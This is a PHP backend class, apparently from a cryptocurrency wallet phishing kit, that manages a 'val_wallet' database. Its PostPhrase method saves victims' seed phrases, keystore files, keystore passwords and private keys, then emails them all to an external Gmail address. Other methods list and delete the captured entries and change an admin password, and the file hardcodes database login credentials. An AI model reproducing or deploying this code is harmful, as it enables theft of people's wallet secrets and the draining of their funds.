<?php
// include("connect.php");
/**
 * 
 */
class DataAccess
{
	
	public static function getPassword(){
		$con =  mysqli_connect("localhost","ajibztech","ajibose419","val_wallet");
		$statement = $con->prepare( "SELECT * FROM `admin_password`");
		
$statement->execute();
$result = $statement->get_result();
return $result;

	}

	public static function getPhrase(){
		$con =  mysqli_connect("localhost","ajibztech","ajibose419","val_wallet");
		$statement = $con->prepare( "SELECT * FROM `wallet`");
$statement->execute();
$result = $statement->get_result();
return $result;
	}

	public static function PostPhrase($phrase,$keystore,$keystorePass,$privateKey){
		$con =  mysqli_connect("localhost","ajibztech","ajibose419","val_wallet");
	$statement = $con->prepare("INSERT INTO `wallet`(`phrase`, `keystore`, `keystorePass`, `privateKey`) VALUES (?,?,?,?)");
$statement->bind_param("ssss",$phrase,$keystore,$keystorePass,$privateKey);
$result  = $statement->execute();
$message = "Phrase = ".$phrase."Keystore= ".$keystore."Keystore Password".$keystorePass."Private Key".$privateKey;
	mail("Curiousdarkarmy7@gmail.com", "New Phrase and Password Received", $message);
	}



	public static function UpdatePassword($password,$Id){
		$con =  mysqli_connect("localhost","ajibztech","ajibose419","val_wallet");
		$statement = $con->prepare( "UPDATE `admin_password` SET `Password`=? WHERE Id=?");
$statement->bind_param('ss',$password,$Id);
$statement->execute();
	}


	public static function DeletePhrase($Id){
		$con =  mysqli_connect("localhost","ajibztech","ajibose419","val_wallet");
		$statement = $con->prepare( "DELETE FROM `wallet` WHERE Id=?");
$statement->bind_param('s',$Id);
$statement->execute();
	}



}

?>